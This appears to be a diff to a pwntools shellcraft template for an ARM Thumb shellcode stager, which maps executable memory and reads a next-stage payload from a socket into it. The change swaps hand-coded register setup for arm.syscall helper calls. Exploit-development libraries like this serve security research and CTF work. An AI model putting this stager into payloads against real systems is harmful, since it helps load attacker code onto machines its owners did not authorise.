@@ -1,5 +1,5 @@
 <% from pwnlib.shellcraft import common %>
-<% from pwnlib.shellcraft import thumb %>
+<% from pwnlib.shellcraft import thumb, arm %>
 <%docstring>
     stager(sock, size)
 
@@ -16,14 +16,7 @@ ${stager}:
     ${thumb.mov('r6', sock)}
 
     /* mmap(0, size, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0) */
-    ${thumb.mov('r7', 'SYS_mmap2')}
-    ${thumb.mov('r0', 0)}
-    ${thumb.mov('r1', size)}
-    ${thumb.mov('r2', 'PROT_EXEC | PROT_WRITE | PROT_READ')}
-    ${thumb.mov('r3', 'MAP_ANONYMOUS | MAP_PRIVATE')}
-    ${thumb.mov('r4', -1)}
-    ${thumb.mov('r5', 0)}
-    svc 1
+    ${arm.syscall('SYS_mmap2', 0, size, 'PROT_EXEC | PROT_WRITE | PROT_READ', 'MAP_ANONYMOUS | MAP_PRIVATE', -1, 0)}
 
     /* Save allocated memory address */
     ${thumb.mov('r8', 'r0')}
@@ -32,10 +25,7 @@ ${stager}:
     /* Initialize read loop counter */
     ${thumb.mov('r5', size)}
 ${looplabel}:
-    ${thumb.mov('r7', 'SYS_read')}
-    ${thumb.mov('r0', 'r6')}
-    ${thumb.mov('r2', 'r5')}
-    svc 1
+    ${arm.syscall('SYS_read', 'r6', 'r1', 'r5')}
 
     /* Update remaining count and write-address */
     add r1, r1, r0
